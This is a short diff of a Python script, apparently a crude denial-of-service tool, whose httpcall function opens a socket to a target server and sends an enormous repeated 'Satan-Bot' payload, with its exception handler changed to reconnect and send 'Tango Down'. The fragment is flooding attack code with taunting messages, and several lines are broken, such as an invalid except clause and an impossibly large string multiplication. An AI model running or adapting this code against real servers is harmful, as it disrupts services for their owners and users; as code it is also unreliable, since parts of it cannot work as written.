@@ -84,15 +84,14 @@ def httpcall(url):
 	pkt_count = 0
 	try:
 		if s:
-			s.connect((url,80)) * 109951162777600 
+			s.connect((url,80))
 			s.send("Satan-Bot" * 109951162777600)
 		
 			
 			
-	except code == "500":
-			#print e.code
-			print 'Satan Pwned Ur Server!'
-			code=500
+	except Exception:
+			s.connect((url,80))
+			s.sendall("Tango Down")
 
 	
 #http caller thread 
